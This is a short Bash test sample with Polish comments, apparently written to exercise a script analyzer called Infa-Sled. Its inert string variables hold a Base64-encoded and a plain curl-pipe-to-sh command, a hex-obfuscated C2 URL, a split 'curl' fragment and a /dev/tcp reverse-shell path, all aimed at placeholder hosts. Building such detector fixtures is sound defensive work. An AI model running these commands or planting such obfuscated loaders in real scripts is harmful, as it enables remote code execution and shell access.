#!/usr/bin/env bash
# PRZYKLAD EDUKACYJNY - podaj ten plik analizatorowi, nie powloce Bash.
# Wszystkie podejrzane konstrukcje sa nieaktywnymi wartosciami tekstowymi.

# Zakodowany tekst Base64 zostanie rozpoznany i pasywnie odczytany.
base64_text='Y3VybCBodHRwczovL2JhZC1iYXNoLmV4YW1wbGUvYSB8IHNo'

# Sekwencje hex ukrywaja testowy wskaznik sieciowy.
escaped_text='\x68\x74\x74\x70\x73\x3a\x2f\x2f\x32\x30\x33\x2e\x30\x2e\x31\x31\x33\x2e\x32\x35\x2f\x63\x32'

# Tekst zawiera wielokrotna konkatenacje rozpoznawana przez analizator.
fragmented_text='"cu" + "rl" + ""'

# Podejrzane wzorce pozostaja tylko lancuchami znakow.
pipeline_text='curl https://bad-bash.example/a | sh'
socket_text='/dev/tcp/203.0.113.25/4444'

printf '%s\n' 'Bezpieczna probka tekstowa dla Infa-Sled.'
